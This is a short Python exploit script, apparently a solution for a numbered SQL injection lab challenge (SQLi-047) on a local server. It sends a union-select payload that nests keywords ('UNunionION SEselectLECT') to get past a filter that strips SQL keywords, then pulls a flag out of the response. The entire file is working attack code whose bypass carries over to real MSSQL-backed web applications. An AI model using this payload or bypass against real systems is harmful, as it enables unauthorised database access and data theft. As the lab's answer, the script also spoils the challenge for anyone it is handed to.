#!/usr/bin/env python3
"""SQLi-047: MSSQL Double Keyword Bypass - Exploit"""
import requests

TARGET = "http://localhost:5047/employee"

def exploit():
    print("[*] SQLi-047: MSSQL Double Keyword Bypass")
    
    # Double keyword bypass: UNunionION SEselectLECT
    payload = "0 UNunionION SEselectLECT 1,name,value,4 FROM flags--"
    r = requests.get(TARGET, params={"id": payload})
    
    if "FLAG{" in r.text:
        start = r.text.find("FLAG{")
        end = r.text.find("}", start) + 1
        print(f"[+] FLAG: {r.text[start:end]}")
    else:
        print("[-] Exploit failed")

if __name__ == "__main__":
    exploit()
